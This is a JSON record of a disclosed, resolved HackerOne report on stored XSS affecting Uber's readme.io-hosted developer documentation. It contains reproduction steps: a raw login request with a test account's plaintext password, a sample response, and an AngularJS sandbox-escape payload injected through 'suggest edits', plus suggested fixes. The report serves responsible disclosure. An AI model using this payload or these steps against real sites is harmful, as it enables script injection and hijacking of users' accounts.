{
  "id": 131450,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzE0NTA=",
  "url": "https://hackerone.com/reports/131450",
  "title": "Stored XSS in developer.uber.com",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-04-16T22:25:38.643Z",
  "submitted_at": "2016-04-16T22:25:38.643Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "albinowax",
    "url": "/albinowax",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/056/414/9d843d496965d8c0e710de3867a41720c1577dc4_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 314,
    "url": "https://hackerone.com/uber",
    "handle": "uber",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Uber",
      "twitter_handle": "",
      "website": "https://www.uber.com",
      "about": ""
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2016-06-27T12:37:42.236Z",
  "bug_reporter_agreed_on_going_public_at": "2016-05-28T12:37:41.349Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "An attacker can make a series of requests to https://uber.readme.io/ that will result in permanent defacement/stored XSS of all the documentation pages on https://developer.uber.com/\n\nI'm not entirely sure if this is in scope, but it could definitely have a major impact on developer.uber.com so I figure you'd like to know either way. \n\n\nReproduction steps:\n\nLoad https://uber.readme.io/docs/deep-linking to get a connect.sid cookie\nAuthenticate the session by sending the following request to uber.readme.io:\n```\nPOST /users/session HTTP/1.1\nHost: uber.readme.io\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/json;charset=utf-8\nContent-Length: 84\nCookie: YOUR CONNECT.SID COOKIE HERE\nConnection: close\nPragma: no-cache\nCache-Control: no-cache\n\n{\"email\":\"readme2@thursday.eml.cc\",\"password\":\"pjJnBODjkLFv!!11\",\"action\":\"session\"}\n```\n\nIf this worked, you'll see a response body something like \n```\n{\"id\":\"57129b7365324b0e002ad83b\",\"name\":\"James Kettle\",\"email\":\"readme2@thursday.eml.cc\",\"username\":\"\",\"provider\":\"local\",\"createdAt\":\"2016-04-16T20:07:15.871Z\",\"accessToken\":\"\",\"stripeId\":\"\",\"hasStripe\":false,\"email_verified\":false,\"hasGithub\":false,\"github\":{},\"is_admin\":false,\"is_god\":false}\n```\nGrab the new connect.sid cookie from this response.\n\nUsing the new connect.sid cookie value, load https://uber.readme.io/docs/deep-linking/edit - you should land on a 'Suggest edits' page (see screenshot)\n\nAdd the following payload into the document:\n```{{(_=\"\".sub).call.call({}[$=\"constructor\"].getOwnPropertyDescriptor(_.__proto__,$).value,0,\"alert(1)\")()}}```\nThen enter an arbitrary description then press 'suggest edits'. \n\nWhen an administrator next views the readme dashboard and clicks on the suggested edit, the injected JavaScript will execute (see screenshot). This JavaScript could automatically approve the suggestion.\n\nCongrats, you've now got your own JavaScript executing on https://uber.readme.io/docs/deep-linking - potentially hijacking the account of every developer who views it. \n\nThe obvious way to patch this is using the ng-nonbindable directive to nullify the stored-xss-via-suggested-edits problem. However, since readme.io appears to have a weak security posture, it may be worth considering shifting the readme.io-powered documentation to a separate domain from developer.uber.com, to ensure that XSS in readme.io can't hijack developer accounts.\n\nLet me know if a video would be helpful.",
  "bounty_amount": "7500.0",
  "formatted_bounty": "$7,500",
  "weakness": {
    "id": 60,
    "name": "Cross-site Scripting (XSS) - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2016-06-27T12:37:41.680Z",
  "allow_singular_disclosure_after": -240794992.82371107,
  "singular_disclosure_allowed": true,
  "vote_count": 213,
  "voters": [
    "shinkbr",
    "philip",
    "irek",
    "dirk",
    "lukasreschke",
    "n1m0",
    "arneswinnen",
    "jensec",
    "bendtheory",
    "crazy_diam0nd",
    "and 203 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
